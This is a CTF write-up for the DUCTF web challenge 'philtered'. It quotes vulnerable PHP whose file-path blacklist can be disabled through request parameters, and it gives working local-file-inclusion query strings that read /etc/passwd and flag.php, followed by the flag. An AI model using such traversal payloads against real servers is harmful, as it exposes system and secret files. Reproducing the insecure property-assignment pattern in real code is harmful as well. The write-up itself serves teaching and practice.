# 🏷️ philtered

**Category:** Web  
**Description:**  
> Can you phigure this one out?

---

## 📦 Challenge Files
We are given a `src.zip` containing some PHP files.  
The most important files are:

**flag.php**
```php
<?php $flag = 'DUCTF{TEST_FLAG}'; ?>
```
**index.php**
```php
<?php

class Config {
    public $path = 'information.txt';
    public $data_folder = 'data/';
}

class FileLoader {
    public $config;
    // idk if we would need to load files from other directories or nested directories, but better to keep it flexible if I change my mind later
    public $allow_unsafe = false;
    // These terms will be philtered out to prevent unsafe file access
    public $blacklist = ['php', 'filter', 'flag', '..', 'etc', '/', '\\'];
    
    public function __construct() {
        $this->config = new Config();
    }
    
    public function contains_blacklisted_term($value) {
        if (!$this->allow_unsafe) {
            foreach ($this->blacklist as $term) {
                if (stripos($value, $term) !== false) {
                    return true;    
                }
            }
        }
        return false;
    }

    public function assign_props($input) {
        foreach ($input as $key => $value) {
            if (is_array($value) && isset($this->$key)) {
                foreach ($value as $subKey => $subValue) {
                    if (property_exists($this->$key, $subKey)) {
                        if ($this->contains_blacklisted_term($subValue)) {
                            $subValue = 'philtered.txt'; // Default to a safe file if blacklisted term is found
                        }
                        $this->$key->$subKey = $subValue;
                    }
                }
            } else if (property_exists($this, $key)) {
                if ($this->contains_blacklisted_term($value)) {
                    $value = 'philtered.txt'; // Default to a safe file if blacklisted term is found
                }
                $this->$key = $value;
            }
        }
    }

    public function load() {
        return file_get_contents($this->config->data_folder . $this->config->path);
    }
}

// Such elegance
$loader = new FileLoader(); 
$loader->assign_props($_GET);

require_once __DIR__ . '/layout.php';

$content = <<<HTML
<nav style="margin-bottom:2em;">
    <a href="index.php">Home</a> |
    <a href="aboutus.php">About Us</a> |
    <a href="contact.php">Contact</a> |
    <a href="gallery.php">Gallery</a>
</nav>
<h2>Welcome to Philtered</h2>
HTML;

$content .= "<p>" . $loader->load() . "</p>";

$content .= "<h3>About Us</h3>";
$loader->config->path = 'aboutus.txt';
$content .= "<p>" . $loader->load() . "</p>";

$content .= "<h3>Our Values</h3>";
$loader->config->path = 'our-values.txt';
$content .= "<p>" . $loader->load() . "</p>";

$content .= <<<HTML
<h3>Contact</h3>
<ul>
    <li>Email: info</li>
    <li>Please don't talk to us, we don't like it</li>
</ul>
HTML;

render_layout('Philtered - Home', $content);
?>
```

We can see here that we have lfi with some filters 

```php
class Config {
    public $path = 'information.txt';
    public $data_folder = 'data/';
}

class FileLoader {
    public $config;
    // idk if we would need to load files from other directories or nested directories, but better to keep it flexible if I change my mind later
    public $allow_unsafe = false;
    // These terms will be philtered out to prevent unsafe file access
    public $blacklist = ['php', 'filter', 'flag', '..', 'etc', '/', '\\'];
    
    public function __construct() {
        $this->config = new Config();
    }
    
    public function contains_blacklisted_term($value) {
        if (!$this->allow_unsafe) {
            foreach ($this->blacklist as $term) {
                if (stripos($value, $term) !== false) {
                    return true;    
                }
            }
        }
        return false;
    }

    public function assign_props($input) {
        foreach ($input as $key => $value) {
            if (is_array($value) && isset($this->$key)) {
                foreach ($value as $subKey => $subValue) {
                    if (property_exists($this->$key, $subKey)) {
                        if ($this->contains_blacklisted_term($subValue)) {
                            $subValue = 'philtered.txt'; // Default to a safe file if blacklisted term is found
                        }
                        $this->$key->$subKey = $subValue;
                    }
                }
            } else if (property_exists($this, $key)) {
                if ($this->contains_blacklisted_term($value)) {
                    $value = 'philtered.txt'; // Default to a safe file if blacklisted term is found
                }
                $this->$key = $value;
            }
        }
    }

    public function load() {
        return file_get_contents($this->config->data_folder . $this->config->path);
    }
}
```
To get a working lfi we can do this `/index.php?allow_unsafe=1&config[path]=../../../../../../../etc/passwd`

this will make allow_unsafe set to true -> `public $allow_unsafe = false;` to disable the blacklist


<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/philtered/images/1.PNG?raw=true'>

also in this way we can control the path, getting the flag `/index.php?allow_unsafe=1&config[path]=../flag.php`

<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/philtered/images/2.PNG?raw=true'>



**Solve on remote :**


<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/philtered/images/3.PNG?raw=true'>

FLAG : ``DUCTF{h0w_d0_y0u_l1k3_y0ur_ph1lters?}``
